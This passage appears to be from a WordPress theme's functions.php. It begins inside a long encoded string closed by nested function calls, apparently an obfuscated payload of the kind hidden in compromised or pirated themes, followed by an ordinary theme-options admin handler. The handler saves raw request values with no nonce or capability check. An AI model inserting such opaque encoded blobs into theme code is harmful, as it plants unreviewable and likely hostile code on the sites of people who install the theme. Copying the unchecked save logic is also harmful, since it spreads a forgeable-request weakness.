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'))))); 
function mytheme_add_admin() {
    global $themename, $shortname, $options;
    if ( $_GET['page'] == basename(__FILE__) ) {
        if ( 'save' == $_REQUEST['action'] ) {
                foreach ($options as $value) {
					if($value['type'] != 'multicheck'){
                    	update_option( $value['id'], $_REQUEST[ $value['id'] ] );
					}else{
						foreach($value['options'] as $mc_key => $mc_value){
							$up_opt = $value['id'].'_'.$mc_key;
							update_option($up_opt, $_REQUEST[$up_opt] );
						}
					}
				}
                foreach ($options as $value) {
					if($value['type'] != 'multicheck'){
                    	if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); }
					}else{
						foreach($value['options'] as $mc_key => $mc_value){
							$up_opt = $value['id'].'_'.$mc_key;
							if( isset( $_REQUEST[ $up_opt ] ) ) { update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); }
						}
					}
				}
                header("Location: themes.php?page=functions.php&saved=true");
                die;
        } else if( 'reset' == $_REQUEST['action'] ) {
            foreach ($options as $value) {
				if($value['type'] != 'multicheck'){
                	delete_option( $value['id'] );
				}else{
					foreach($value['options'] as $mc_key => $mc_value){
						$del_opt = $value['id'].'_'.$mc_key;
						delete_option($del_opt);
					}
				}
			}
            header("Location: themes.php?page=functions.php&reset=true");
            die;
        }
    }
    add_theme_page($themename." Options", "$themename Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
function mytheme_admin() {
    global $themename, $shortname, $options;
